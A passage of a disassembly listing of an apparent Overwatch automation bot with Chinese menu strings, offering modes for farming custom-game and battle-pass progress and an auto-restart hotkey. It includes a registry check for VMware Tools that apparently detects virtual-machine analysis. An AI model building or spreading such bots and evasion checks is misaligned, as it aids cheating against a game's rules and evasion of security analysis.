0000000140003f54  lea      rdx, [rbp - 0x40]                               
0000000140003f58  lea      rcx, [rip + 0x4e49]                              ; 0x140008da8 "COMSPEC"
0000000140003f5f  call     qword ptr [rip + 0x4263]                         ; 0x1400081c8 KERNEL32.DLL!GetEnvironmentVariableA
0000000140003f65  lea      rdx, [rbp - 0x40]                               
0000000140003f69  mov      rcx, qword ptr [rdi]                            
0000000140003f6c  call     qword ptr [rip + 0x412e]                         ; 0x1400080a0 KERNEL32.DLL!lstrcmpiA
0000000140003f72  test     eax, eax                                        
0000000140003f74  je       0x140003fac                                      ; 0x140003fac
0000000140003f76  lea      rcx, [rbp - 0x40]                               
0000000140003f7a  call     0x140005f1c                                      ; 0x140005f1c
0000000140003f7f  xor      eax, eax                                        
0000000140003f81  mov      rcx, qword ptr [rbp + 0xd0]                     
0000000140003f88  xor      rcx, rsp                                        
0000000140003f8b  call     0x1400062f0                                      ; 0x1400062f0
0000000140003f90  lea      r11, [rsp + 0x1e0]                              
0000000140003f98  mov      rbx, qword ptr [r11 + 0x30]                     
0000000140003f9c  mov      rsi, qword ptr [r11 + 0x40]                     
0000000140003fa0  mov      rsp, r11                                        
0000000140003fa3  pop      r14                                             
0000000140003fa5  pop      r13                                             
0000000140003fa7  pop      r12                                             
0000000140003fa9  pop      rdi                                             
0000000140003faa  pop      rbp                                             
0000000140003fab  ret                                                      
0000000140003fac  cmp      ebx, 2                                           ; 0x2
0000000140003faf  jl       0x140003f7f                                      ; 0x140003f7f
0000000140003fb1  mov      ecx, 1                                           ; 0x1
0000000140003fb6  call     qword ptr [rip + 0x4204]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140003fbc  mov      rcx, qword ptr [rdi + 8]                        
0000000140003fc0  call     0x14000614c                                      ; 0x14000614c
0000000140003fc5  mov      ecx, 0xfffffff6                                  ; 0xfffffff6
0000000140003fca  call     qword ptr [rip + 0x4210]                         ; 0x1400081e0 KERNEL32.DLL!GetStdHandle
0000000140003fd0  mov      rbx, rax                                        
0000000140003fd3  lea      rdx, [rbp - 0x70]                               
0000000140003fd7  mov      rcx, rax                                        
0000000140003fda  call     qword ptr [rip + 0x4078]                         ; 0x140008058 KERNEL32.DLL!GetConsoleMode
0000000140003fe0  mov      edx, dword ptr [rbp - 0x70]                     
0000000140003fe3  and      edx, 0xffffffaf                                  ; 0xffffffaf
0000000140003fe6  mov      rcx, rbx                                        
0000000140003fe9  call     qword ptr [rip + 0x41e9]                         ; 0x1400081d8 KERNEL32.DLL!SetConsoleMode
0000000140003fef  mov      ecx, 0x3a8                                       ; 0x3a8
0000000140003ff4  call     qword ptr [rip + 0x40b6]                         ; 0x1400080b0 KERNEL32.DLL!SetConsoleOutputCP
0000000140003ffa  lea      rcx, [rip + 0x4718]                              ; 0x140008719
0000000140004001  call     qword ptr [rip + 0x41e1]                         ; 0x1400081e8 KERNEL32.DLL!SetConsoleTitleA
0000000140004007  mov      ecx, 0x80000003                                  ; 0x80000003
000000014000400c  call     qword ptr [rip + 0x407e]                         ; 0x140008090 KERNEL32.DLL!SetThreadExecutionState
0000000140004012  lea      rax, [rbp - 0x80]                               
0000000140004016  mov      qword ptr [rsp + 0x20], rax                     
000000014000401b  mov      r9d, 0x20019                                     ; 0x20019
0000000140004021  xor      r8d, r8d                                        
0000000140004024  lea      rdx, [rip + 0x4d85]                              ; 0x140008db0 "SOFTWARE\\VMware, Inc.\\VMware Tools"
000000014000402b  mov      rcx, 0xffffffff80000002                          ; -0x7ffffffe
0000000140004032  call     qword ptr [rip + 0x3fd0]                         ; 0x140008008 ADVAPI32.dll!RegOpenKeyExA
0000000140004038  test     eax, eax                                        
000000014000403a  jne      0x14000404b                                      ; 0x14000404b
000000014000403c  mov      rcx, qword ptr [rbp - 0x80]                     
0000000140004040  call     qword ptr [rip + 0x3fca]                         ; 0x140008010 ADVAPI32.dll!RegCloseKey
0000000140004046  call     0x140003d40                                      ; 0x140003d40
000000014000404b  lea      rsi, [rip + 0x4d86]                              ; 0x140008dd8 "======================================"
0000000140004052  mov      qword ptr [rsp + 0x30], rsi                     
0000000140004057  lea      rax, [rip + 0x4da2]                              ; 0x140008e00 "自由死斗 (宽高比,颜色,赞赏键需默认。HDR,显卡/颜色滤镜关闭，保留战网窗口可自动重上。)"
000000014000405e  mov      qword ptr [rsp + 0x38], rax                     
0000000140004063  lea      rax, [rip + 0x4dee]                              ; 0x140008e58 "托比昂赢 (战令房托比昂赢的那边开启。帧率：不要低于60。)"
000000014000406a  mov      qword ptr [rsp + 0x40], rax                     
000000014000406f  lea      rax, [rip + 0x4e1a]                              ; 0x140008e90 "托比昂输 (战令房托比昂输的那边开启，路霸、女王也通用。)"
0000000140004076  mov      qword ptr [rsp + 0x48], rax                     
000000014000407b  lea      rax, [rip + 0x4e4e]                              ; 0x140008ed0 "房主重开 (需先设置热键 重新开始自定游戏 为F2。黑屏结束127秒后重开。)"
0000000140004082  mov      qword ptr [rsp + 0x50], rax                     
0000000140004087  lea      rax, [rip + 0x4e8a]                              ; 0x140008f18 "自由死斗"
000000014000408e  mov      qword ptr [rsp + 0x58], rax                     
0000000140004093  lea      rax, [rip + 0x4e8e]                              ; 0x140008f28 "托比昂赢"
000000014000409a  mov      qword ptr [rsp + 0x60], rax                     
000000014000409f  lea      rax, [rip + 0x4e92]                              ; 0x140008f38 "托比昂输"
00000001400040a6  mov      qword ptr [rsp + 0x68], rax                     
00000001400040ab  lea      rax, [rip + 0x4e96]                              ; 0x140008f48 "房主重开"
00000001400040b2  mov      qword ptr [rsp + 0x70], rax                     
00000001400040b7  lea      rdx, [rip + 0x4ea2]                              ; 0x140008f60 "用前须知：这是免费的使用造成的一切后果自负！更新Q群：667546138 更新日期：6月17日 17点30分"
00000001400040be  mov      ecx, 0xc                                         ; 0xc
00000001400040c3  call     0x14000149c                                      ; 0x14000149c
00000001400040c8  mov      rdx, rsi                                        
00000001400040cb  mov      r12d, 0xb                                        ; 0xb
00000001400040d1  mov      ecx, r12d                                       
00000001400040d4  call     0x14000149c                                      ; 0x14000149c
00000001400040d9  lea      rdx, [rip + 0x4ee0]                              ; 0x140008fc0 "(后台版：需要开窗口化，可最小化玩电脑)"
00000001400040e0  lea      r13d, [r12 + 3]                                 
00000001400040e5  mov      ecx, r13d                                       
00000001400040e8  call     0x14000149c                                      ; 0x14000149c
00000001400040ed  mov      rdx, rsi                                        
00000001400040f0  mov      ecx, r12d                                       
00000001400040f3  call     0x14000149c                                      ; 0x14000149c
00000001400040f8  lea      edi, [r12 - 0xa]                                
00000001400040fd  lea      ebx, [rdi + 4]                                  
0000000140004100  mov      r9, qword ptr [rsp + rdi*8 + 0x30]              
0000000140004105  mov      r8, rdi                                         
0000000140004108  lea      rdx, [rip + 0x4ed9]                              ; 0x140008fe8 "%d = %s"
000000014000410f  mov      ecx, 0xa                                         ; 0xa
0000000140004114  call     0x14000149c                                      ; 0x14000149c
0000000140004119  inc      rdi                                             
000000014000411c  cmp      rdi, rbx                                        
000000014000411f  jb       0x140004100                                      ; 0x140004100
0000000140004121  mov      rdx, rsi                                        
0000000140004124  mov      ecx, r12d                                       
0000000140004127  call     0x14000149c                                      ; 0x14000149c
000000014000412c  lea      rdx, [rip + 0x4ebd]                              ; 0x140008ff0 "(前台版：与宏效果一样，不可以操作电脑)"
0000000140004133  mov      ecx, r13d                                       
0000000140004136  call     0x14000149c                                      ; 0x14000149c
000000014000413b  mov      rdx, rsi                                        
000000014000413e  mov      ecx, r12d                                       
0000000140004141  call     0x14000149c                                      ; 0x14000149c
0000000140004146  mov      r13d, 0xd                                        ; 0xd
000000014000414c  mov      r9, qword ptr [rsp + rbx*8 + 0x30]              
0000000140004151  mov      r8, rbx                                         
0000000140004154  lea      rdx, [rip + 0x4e8d]                              ; 0x140008fe8 "%d = %s"
000000014000415b  mov      ecx, r13d                                       
000000014000415e  call     0x14000149c                                      ; 0x14000149c
0000000140004163  inc      rbx                                             
0000000140004166  cmp      rbx, 9                                           ; 0x9
000000014000416a  jb       0x14000414c                                      ; 0x14000414c
000000014000416c  mov      rdx, rsi                                        
000000014000416f  mov      ecx, r12d                                       
0000000140004172  call     0x14000149c                                      ; 0x14000149c
0000000140004177  xorps    xmm0, xmm0                                      
000000014000417a  movups   xmmword ptr [rbp - 0x68], xmm0                  
000000014000417e  movdqa   xmm1, xmmword ptr [rip + 0x524a]                 ; 0x1400093d0
0000000140004186  movdqu   xmmword ptr [rbp - 0x58], xmm1                  
000000014000418b  mov      byte ptr [rbp - 0x68], r14b                     
000000014000418f  mov      r12d, 0xa                                        ; 0xa
0000000140004195  lea      rdx, [rip + 0x4e7c]                              ; 0x140009018 "请输入脚本编号 (1-8)："
000000014000419c  mov      ecx, 7                                           ; 0x7
00000001400041a1  call     0x14000149c                                      ; 0x14000149c
00000001400041a6  lea      rdx, [rbp - 0x68]                               
00000001400041aa  mov      rcx, qword ptr [rip + 0x407f]                    ; 0x140008230 MSVCP140.dll!?cin@std@@3V?$basic_istream@DU?$char_traits@D@std@@@1@A
00000001400041b1  call     0x1400046d0                                      ; 0x1400046d0
00000001400041b6  call     qword ptr [rip + 0x42a4]                         ; 0x140008460 api-ms-win-crt-runtime-l1-1-0.dll!_errno
00000001400041bc  mov      rsi, rax                                        
00000001400041bf  lea      rbx, [rbp - 0x68]                               
00000001400041c3  cmp      qword ptr [rbp - 0x50], 0xf                      ; 0xf
00000001400041c8  cmova    rbx, qword ptr [rbp - 0x68]                     
00000001400041cd  mov      dword ptr [rax], r14d                           
00000001400041d0  mov      r8d, r12d                                       
00000001400041d3  lea      rdx, [rbp - 0x78]                               
00000001400041d7  mov      rcx, rbx                                        
00000001400041da  call     qword ptr [rip + 0x41f0]                         ; 0x1400083d0 api-ms-win-crt-convert-l1-1-0.dll!strtol
00000001400041e0  mov      edi, eax                                        
00000001400041e2  cmp      rbx, qword ptr [rbp - 0x78]                     
00000001400041e6  je       0x1400044ed                                      ; 0x1400044ed
00000001400041ec  cmp      dword ptr [rsi], 0x22                            ; 0x22
00000001400041ef  je       0x1400044df                                      ; 0x1400044df
00000001400041f5  cmp      eax, 1                                           ; 0x1
00000001400041f8  jl       0x140004195                                      ; 0x140004195
00000001400041fa  cmp      eax, 8                                           ; 0x8
00000001400041fd  jg       0x140004195                                      ; 0x140004195
00000001400041ff  lea      rcx, [rip + 0x4e2a]                              ; 0x140009030
0000000140004206  call     qword ptr [rip + 0x428c]                         ; 0x140008498 api-ms-win-crt-runtime-l1-1-0.dll!system
000000014000420c  mov      dword ptr [rip + 0x8062], edi                    ; 0x14000c274
0000000140004212  cmp      edi, 4                                           ; 0x4
0000000140004215  jle      0x140004233                                      ; 0x140004233
0000000140004217  lea      eax, [rdi - 4]                                  
000000014000421a  mov      dword ptr [rip + 0x8054], eax                    ; 0x14000c274
0000000140004220  mov      bl, r14b                                        
0000000140004223  mov      byte ptr [rip + 0x7e8a], r14b                    ; 0x14000c0b4
000000014000422a  lea      rcx, [rip + 0x4967]                              ; 0x140008b98 "等待开启"
0000000140004231  jmp      0x14000423c                                      ; 0x14000423c
0000000140004233  mov      bl, 1                                            ; 0x1
0000000140004235  lea      rcx, [rip + 0x492c]                              ; 0x140008b68 "正在运行"
000000014000423c  call     0x1400012f4                                      ; 0x1400012f4
0000000140004241  movsxd   rax, dword ptr [rip + 0x802c]                    ; 0x14000c274
0000000140004248  lea      r8, [rbp - 0x68]                                
000000014000424c  cmp      qword ptr [rbp - 0x50], 0xf                      ; 0xf
0000000140004251  cmova    r8, qword ptr [rbp - 0x68]                      
0000000140004256  mov      ecx, r12d                                       
0000000140004259  cmp      edi, 4                                           ; 0x4
000000014000425c  cmovg    ecx, r13d                                       
0000000140004260  mov      r9, qword ptr [rsp + rax*8 + 0x30]              
0000000140004265  lea      rdx, [rip + 0x4dcc]                              ; 0x140009038 "选择：%s %s"
000000014000426c  call     0x14000149c                                      ; 0x14000149c
0000000140004271  call     0x1400021ac                                      ; 0x1400021ac
0000000140004276  test     al, al                                          
0000000140004278  jne      0x14000427f                                      ; 0x14000427f
000000014000427a  call     0x140002830                                      ; 0x140002830
000000014000427f  lea      rdx, [rip + 0x4dc2]                              ; 0x140009048 "开关热键：F3需在(游戏内或当前窗口内)。"
0000000140004286  mov      r12d, 0xc                                        ; 0xc
000000014000428c  mov      ecx, r12d                                       
000000014000428f  call     0x14000149c                                      ; 0x14000149c
0000000140004294  mov      eax, dword ptr [rip + 0x7fda]                    ; 0x14000c274
000000014000429a  cmp      eax, 1                                           ; 0x1
000000014000429d  je       0x1400042a4                                      ; 0x1400042a4
000000014000429f  cmp      eax, 4                                           ; 0x4
00000001400042a2  jne      0x1400042ff                                      ; 0x1400042ff
00000001400042a4  call     0x14000231c                                      ; 0x14000231c
00000001400042a9  mov      byte ptr [rip + 0x7f84], 1                       ; 0x14000c234 | 0x1
00000001400042b0  mov      ecx, r14d                                       
00000001400042b3  mov      edx, dword ptr [rip + 0x7fc3]                    ; 0x14000c27c
00000001400042b9  imul     edx, dword ptr [rip + 0x7f94]                    ; 0x14000c254
00000001400042c0  test     edx, edx                                        
00000001400042c2  jle      0x1400042e2                                      ; 0x1400042e2
00000001400042c4  mov      r8, qword ptr [rip + 0x7f8d]                     ; 0x14000c258
00000001400042cb  mov      eax, ecx                                        
00000001400042cd  cmp      dword ptr [r8 + rax*4], r14d                    
00000001400042d1  jne      0x1400042db                                      ; 0x1400042db
00000001400042d3  inc      ecx                                             
00000001400042d5  cmp      ecx, edx                                        
00000001400042d7  jl       0x1400042cb                                      ; 0x1400042cb
00000001400042d9  jmp      0x1400042e2                                      ; 0x1400042e2
00000001400042db  mov      byte ptr [rip + 0x7f52], r14b                    ; 0x14000c234
00000001400042e2  call     0x140002360                                      ; 0x140002360
00000001400042e7  cmp      byte ptr [rip + 0x7f46], r14b                    ; 0x14000c234
00000001400042ee  je       0x1400042ff                                      ; 0x1400042ff
00000001400042f0  lea      rdx, [rip + 0x4d79]                              ; 0x140009070 "已切换取色方案！"
00000001400042f7  mov      ecx, r12d                                       
00000001400042fa  call     0x14000149c                                      ; 0x14000149c
00000001400042ff  call     qword ptr [rip + 0x3d93]                         ; 0x140008098 KERNEL32.DLL!GetConsoleWindow
0000000140004305  mov      rsi, rax                                        
0000000140004308  mov      edi, r14d                                       
000000014000430b  call     qword ptr [rip + 0x4047]                         ; 0x140008358 USER32.dll!GetForegroundWindow
0000000140004311  cmp      byte ptr [rip + 0x7d9c], r14b                    ; 0x14000c0b4
0000000140004318  je       0x140004328                                      ; 0x140004328
000000014000431a  cmp      rax, rsi                                        
000000014000431d  je       0x140004328                                      ; 0x140004328
000000014000431f  cmp      rax, qword ptr [rip + 0x7f12]                    ; 0x14000c238
0000000140004326  jne      0x14000433c                                      ; 0x14000433c
0000000140004328  mov      ecx, 0x72                                        ; 0x72
000000014000432d  call     qword ptr [rip + 0x3fdd]                         ; 0x140008310 USER32.dll!GetAsyncKeyState
0000000140004333  test     al, 1                                            ; 0x1
0000000140004335  je       0x14000433c                                      ; 0x14000433c
0000000140004337  test     bl, bl                                          
0000000140004339  sete     bl                                              
000000014000433c  test     bl, bl                                          
000000014000433e  je       0x14000446d                                      ; 0x14000446d
0000000140004344  cmp      qword ptr [rip + 0x7ecd], r14                    ; 0x14000c218
000000014000434b  jne      0x1400043c6                                      ; 0x1400043c6
000000014000434d  xor      edx, edx                                        
000000014000434f  lea      rcx, [rip + 0x44fa]                              ; 0x140008850 "TankWindowClass"
0000000140004356  call     qword ptr [rip + 0x3fdc]                         ; 0x140008338 USER32.dll!FindWindowA
000000014000435c  cmp      qword ptr [rip + 0x7ed5], rax                    ; 0x14000c238
0000000140004363  je       0x14000436a                                      ; 0x14000436a
0000000140004365  call     0x1400021ac                                      ; 0x1400021ac
000000014000436a  call     qword ptr [rip + 0x41e0]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140004370  mov      dword ptr [rip + 0x7eda], eax                    ; 0x14000c250
0000000140004376  cmp      qword ptr [rip + 0x7e9b], r14                    ; 0x14000c218
000000014000437d  jne      0x1400043c6                                      ; 0x1400043c6
000000014000437f  mov      qword ptr [rsp + 0x28], r14                     
0000000140004384  mov      dword ptr [rsp + 0x20], r14d                    
0000000140004389  xor      r9d, r9d                                        
000000014000438c  lea      r8, [rip - 0xc23]                                ; 0x140003770
0000000140004393  xor      edx, edx                                        
0000000140004395  xor      ecx, ecx                                        
0000000140004397  call     qword ptr [rip + 0x3ce3]                         ; 0x140008080 KERNEL32.DLL!CreateThread
000000014000439d  mov      qword ptr [rip + 0x7e74], rax                    ; 0x14000c218
00000001400043a4  test     rax, rax                                        
00000001400043a7  je       0x1400043c6                                      ; 0x1400043c6
00000001400043a9  lea      rdx, [rip + 0x47a8]                              ; 0x140008b58 "线程启动"
00000001400043b0  mov      ecx, 0xa                                         ; 0xa
00000001400043b5  call     0x14000149c                                      ; 0x14000149c
00000001400043ba  lea      rcx, [rip + 0x47a7]                              ; 0x140008b68 "正在运行"
00000001400043c1  call     0x1400012f4                                      ; 0x1400012f4
00000001400043c6  call     qword ptr [rip + 0x4184]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400043cc  cmp      eax, edi                                        
00000001400043ce  jle      0x1400044cf                                      ; 0x1400044cf
00000001400043d4  cmp      dword ptr [rip + 0x7e99], 1                      ; 0x14000c274 | 0x1
00000001400043db  jne      0x1400044cf                                      ; 0x1400044cf
00000001400043e1  lea      rdx, [rip + 0x4ca0]                              ; 0x140009088 "守望先锋"
00000001400043e8  lea      rcx, [rip + 0x4ca5]                              ; 0x140009094 "#32770"
00000001400043ef  call     qword ptr [rip + 0x3f43]                         ; 0x140008338 USER32.dll!FindWindowA
00000001400043f5  test     rax, rax                                        
00000001400043f8  je       0x14000440b                                      ; 0x14000440b
00000001400043fa  lea      rcx, [rip + 0x4c9f]                              ; 0x1400090a0 "出现异常报错。"
0000000140004401  call     0x140001474                                      ; 0x140001474
0000000140004406  call     0x140002750                                      ; 0x140002750
000000014000440b  call     qword ptr [rip + 0x413f]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140004411  lea      edi, [rax + 0x1f4]                              
0000000140004417  cmp      qword ptr [rip + 0x7e1a], r14                    ; 0x14000c238
000000014000441e  je       0x1400044cf                                      ; 0x1400044cf
0000000140004424  add      eax, 0xffffdcd8                                  ; 0xffffdcd8
0000000140004429  cmp      dword ptr [rip + 0x7e21], eax                    ; 0x14000c250
000000014000442f  jge      0x1400044cf                                      ; 0x1400044cf
0000000140004435  xor      edx, edx                                        
0000000140004437  lea      rcx, [rip + 0x4412]                              ; 0x140008850 "TankWindowClass"
000000014000443e  call     qword ptr [rip + 0x3ef4]                         ; 0x140008338 USER32.dll!FindWindowA
0000000140004444  mov      rcx, qword ptr [rip + 0x7ded]                    ; 0x14000c238
000000014000444b  cmp      rcx, rax                                        
000000014000444e  jne      0x1400044cf                                      ; 0x1400044cf
0000000140004450  call     qword ptr [rip + 0x3e72]                         ; 0x1400082c8 USER32.dll!IsWindowVisible
0000000140004456  test     eax, eax                                        
0000000140004458  je       0x1400044cf                                      ; 0x1400044cf
000000014000445a  lea      rcx, [rip + 0x4c4f]                              ; 0x1400090b0 "窗口无响应。"
0000000140004461  call     0x140001474                                      ; 0x140001474
0000000140004466  call     0x140002750                                      ; 0x140002750
000000014000446b  jmp      0x1400044cf                                      ; 0x1400044cf
000000014000446d  cmp      qword ptr [rip + 0x7da4], r14                    ; 0x14000c218
0000000140004474  je       0x1400044cf                                      ; 0x1400044cf
0000000140004476  lea      rcx, [rip + 0x46fb]                              ; 0x140008b78 "正在停止"
000000014000447d  call     0x1400012f4                                      ; 0x1400012f4
0000000140004482  mov      byte ptr [rip + 0x7dac], 1                       ; 0x14000c235 | 0x1
0000000140004489  or       edx, 0xffffffff                                  ; 0xffffffff
000000014000448c  mov      rcx, qword ptr [rip + 0x7d85]                    ; 0x14000c218
0000000140004493  call     qword ptr [rip + 0x3d1f]                         ; 0x1400081b8 KERNEL32.DLL!WaitForSingleObject
0000000140004499  mov      rcx, qword ptr [rip + 0x7d78]                    ; 0x14000c218
00000001400044a0  call     qword ptr [rip + 0x3bd2]                         ; 0x140008078 KERNEL32.DLL!CloseHandle
00000001400044a6  mov      qword ptr [rip + 0x7d6b], r14                    ; 0x14000c218
00000001400044ad  lea      rdx, [rip + 0x46d4]                              ; 0x140008b88 "线程停止"
00000001400044b4  mov      ecx, r12d                                       
00000001400044b7  call     0x14000149c                                      ; 0x14000149c
00000001400044bc  lea      rcx, [rip + 0x46d5]                              ; 0x140008b98 "等待开启"
00000001400044c3  call     0x1400012f4                                      ; 0x1400012f4
00000001400044c8  mov      byte ptr [rip + 0x7d66], r14b                    ; 0x14000c235
00000001400044cf  mov      ecx, 0xf                                         ; 0xf
00000001400044d4  call     qword ptr [rip + 0x3ce6]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
00000001400044da  jmp      0x14000430b                                      ; 0x14000430b
00000001400044df  lea      rcx, [rip + 0x420a]                              ; 0x1400086f0 "stoi argument out of range"
00000001400044e6  call     qword ptr [rip + 0x3d2c]                         ; 0x140008218 MSVCP140.dll!?_Xout_of_range@std@@YAXPEBD@Z
00000001400044ec  int3                                                     
00000001400044ed  lea      rcx, [rip + 0x41e4]                              ; 0x1400086d8 "invalid stoi argument"
00000001400044f4  call     qword ptr [rip + 0x3d2e]                         ; 0x140008228 MSVCP140.dll!?_Xinvalid_argument@std@@YAXPEBD@Z
00000001400044fa  int3                                                     
00000001400044fb  int3                                                     

; FUNCTION 0x1400044fc

00000001400044fc  push     rbx                                             
00000001400044fe  push     rbp                                             
00000001400044ff  push     rsi                                             
0000000140004500  push     rdi                                             
0000000140004501  sub      rsp, 0x48                                        ; 0x48
0000000140004505  mov      rax, qword ptr [rip + 0x7b34]                    ; 0x14000c040
000000014000450c  xor      rax, rsp                                        
000000014000450f  mov      qword ptr [rsp + 0x38], rax                     
0000000140004514  mov      rbp, rcx                                        
0000000140004517  xor      edx, edx                                        
0000000140004519  lea      rcx, [rsp + 0x28]                               
000000014000451e  call     qword ptr [rip + 0x3d1c]                         ; 0x140008240 MSVCP140.dll!??0_Lockit@std@@QEAA@H@Z
0000000140004524  nop                                                      
0000000140004525  mov      rax, qword ptr [rip + 0x7d64]                    ; 0x14000c290
000000014000452c  mov      qword ptr [rsp + 0x20], rax                     
0000000140004531  mov      rbx, qword ptr [rip + 0x3cd8]                    ; 0x140008210 MSVCP140.dll!?id@?$ctype@D@std@@2V0locale@2@A
0000000140004538  cmp      qword ptr [rbx], 0                               ; 0x0
000000014000453c  jne      0x14000456b                                      ; 0x14000456b
000000014000453e  xor      edx, edx                                        
0000000140004540  lea      rcx, [rsp + 0x30]                               
0000000140004545  call     qword ptr [rip + 0x3cf5]                         ; 0x140008240 MSVCP140.dll!??0_Lockit@std@@QEAA@H@Z
000000014000454b  cmp      qword ptr [rbx], 0                               ; 0x0
000000014000454f  jne      0x140004560                                      ; 0x140004560
0000000140004551  mov      rax, qword ptr [rip + 0x3cc8]                    ; 0x140008220 MSVCP140.dll!?_Id_cnt@id@locale@std@@0HA
0000000140004558  inc      dword ptr [rax]                                 
000000014000455a  movsxd   rax, dword ptr [rax]                            
000000014000455d  mov      qword ptr [rbx], rax                            
0000000140004560  lea      rcx, [rsp + 0x30]                               
0000000140004565  call     qword ptr [rip + 0x3d15]                         ; 0x140008280 MSVCP140.dll!??1_Lockit@std@@QEAA@XZ
000000014000456b  mov      rsi, qword ptr [rbx]                            
000000014000456e  mov      rcx, qword ptr [rbp + 8]                        
0000000140004572  lea      rdi, [rsi*8]                                    
000000014000457a  cmp      rsi, qword ptr [rcx + 0x18]                     
000000014000457e  jae      0x14000458f                                      ; 0x14000458f
0000000140004580  mov      rax, qword ptr [rcx + 0x10]                     
0000000140004584  mov      rbx, qword ptr [rdi + rax]                      
0000000140004588  test     rbx, rbx                                        
000000014000458b  jne      0x1400045f5                                      ; 0x1400045f5
000000014000458d  jmp      0x140004591                                      ; 0x140004591
000000014000458f  xor      ebx, ebx                                        
0000000140004591  cmp      byte ptr [rcx + 0x24], 0                         ; 0x0
0000000140004595  je       0x1400045ab                                      ; 0x1400045ab
0000000140004597  call     qword ptr [rip + 0x3c9b]                         ; 0x140008238 MSVCP140.dll!?_Getgloballocale@locale@std@@CAPEAV_Locimp@12@XZ
000000014000459d  cmp      rsi, qword ptr [rax + 0x18]                     
00000001400045a1  jae      0x1400045b0                                      ; 0x1400045b0
00000001400045a3  mov      rax, qword ptr [rax + 0x10]                     
00000001400045a7  mov      rbx, qword ptr [rdi + rax]                      
00000001400045ab  test     rbx, rbx                                        
00000001400045ae  jne      0x1400045f5                                      ; 0x1400045f5
00000001400045b0  mov      rbx, qword ptr [rsp + 0x20]                     
00000001400045b5  test     rbx, rbx                                        
00000001400045b8  jne      0x1400045f5                                      ; 0x1400045f5
00000001400045ba  mov      rdx, rbp                                        
00000001400045bd  lea      rcx, [rsp + 0x20]                               
00000001400045c2  call     qword ptr [rip + 0x3ca0]                         ; 0x140008268 MSVCP140.dll!?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
00000001400045c8  cmp      rax, -1                                          ; -0x1
00000001400045cc  je       0x140004619                                      ; 0x140004619
00000001400045ce  mov      rbx, qword ptr [rsp + 0x20]                     
00000001400045d3  mov      qword ptr [rsp + 0x30], rbx                     
00000001400045d8  mov      rcx, rbx                                        
00000001400045db  call     0x140006290                                      ; 0x140006290
00000001400045e0  mov      rax, qword ptr [rbx]                            
00000001400045e3  mov      rcx, rbx                                        
00000001400045e6  call     qword ptr [rax + 8]                             
00000001400045e9  mov      rbx, qword ptr [rsp + 0x20]                     
00000001400045ee  mov      qword ptr [rip + 0x7c9b], rbx                    ; 0x14000c290
00000001400045f5  lea      rcx, [rsp + 0x28]                               
00000001400045fa  call     qword ptr [rip + 0x3c80]                         ; 0x140008280 MSVCP140.dll!??1_Lockit@std@@QEAA@XZ
0000000140004600  mov      rax, rbx                                        
0000000140004603  mov      rcx, qword ptr [rsp + 0x38]                     
0000000140004608  xor      rcx, rsp                                        
000000014000460b  call     0x1400062f0                                      ; 0x1400062f0
0000000140004610  add      rsp, 0x48                                        ; 0x48
0000000140004614  pop      rdi                                             
0000000140004615  pop      rsi                                             
0000000140004616  pop      rbp                                             
0000000140004617  pop      rbx                                             
0000000140004618  ret                                                      
0000000140004619  call     0x140001268                                      ; 0x140001268
000000014000461e  nop                                                      
000000014000461f  int3                                                     

; FUNCTION 0x140004620

0000000140004620  mov      rax, rsp                                        
0000000140004623  mov      qword ptr [rax + 0x10], rdx                     
0000000140004627  mov      qword ptr [rax + 0x18], r8                      
000000014000462b  mov      qword ptr [rax + 0x20], r9                      
000000014000462f  push     rbx                                             
0000000140004630  push     rsi                                             
0000000140004631  push     rdi                                             
0000000140004632  sub      rsp, 0x30                                        ; 0x30
0000000140004636  mov      rdi, rdx                                        
0000000140004639  lea      rsi, [rax + 0x18]                               
000000014000463d  mov      rbx, rcx                                        
0000000140004640  call     0x140001010                                      ; 0x140001010
0000000140004645  mov      qword ptr [rsp + 0x28], rsi                     
000000014000464a  mov      r9, rdi                                         
000000014000464d  mov      r8d, 0x14                                        ; 0x14
0000000140004653  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
000000014000465c  mov      rdx, rbx                                        
000000014000465f  mov      rcx, qword ptr [rax]                            
0000000140004662  call     qword ptr [rip + 0x3e80]                         ; 0x1400084e8 api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vsprintf_s
0000000140004668  or       ecx, 0xffffffff                                  ; 0xffffffff
000000014000466b  test     eax, eax                                        
000000014000466d  cmovs    eax, ecx                                        
0000000140004670  add      rsp, 0x30                                        ; 0x30
0000000140004674  pop      rdi                                             
0000000140004675  pop      rsi                                             
0000000140004676  pop      rbx                                             
0000000140004677  ret                                                      

; FUNCTION 0x140004678

0000000140004678  mov      rax, rsp                                        
000000014000467b  mov      qword ptr [rax + 0x10], rdx                     
000000014000467f  mov      qword ptr [rax + 0x18], r8                      
0000000140004683  mov      qword ptr [rax + 0x20], r9                      
0000000140004687  push     rbx                                             
0000000140004688  push     rsi                                             
0000000140004689  push     rdi                                             
000000014000468a  sub      rsp, 0x30                                        ; 0x30
000000014000468e  mov      rdi, rdx                                        
0000000140004691  lea      rsi, [rax + 0x18]                               
0000000140004695  mov      rbx, rcx                                        
0000000140004698  call     0x140001010                                      ; 0x140001010
000000014000469d  mov      qword ptr [rsp + 0x28], rsi                     
00000001400046a2  mov      r9, rdi                                         
00000001400046a5  mov      r8d, 0x20                                        ; 0x20
00000001400046ab  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400046b4  mov      rdx, rbx                                        
00000001400046b7  mov      rcx, qword ptr [rax]                            
00000001400046ba  call     qword ptr [rip + 0x3e28]                         ; 0x1400084e8 api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vsprintf_s
00000001400046c0  or       ecx, 0xffffffff                                  ; 0xffffffff
00000001400046c3  test     eax, eax                                        
00000001400046c5  cmovs    eax, ecx                                        
00000001400046c8  add      rsp, 0x30                                        ; 0x30
00000001400046cc  pop      rdi                                             
00000001400046cd  pop      rsi                                             
00000001400046ce  pop      rbx                                             
00000001400046cf  ret                                                      

; FUNCTION 0x1400046d0

00000001400046d0  mov      qword ptr [rsp + 0x18], rsi                     
00000001400046d5  push     rdi                                             
00000001400046d6  push     r12                                             
00000001400046d8  push     r13                                             
00000001400046da  push     r14                                             
00000001400046dc  push     r15                                             
00000001400046de  sub      rsp, 0x70                                        ; 0x70
00000001400046e2  mov      rsi, rdx                                        
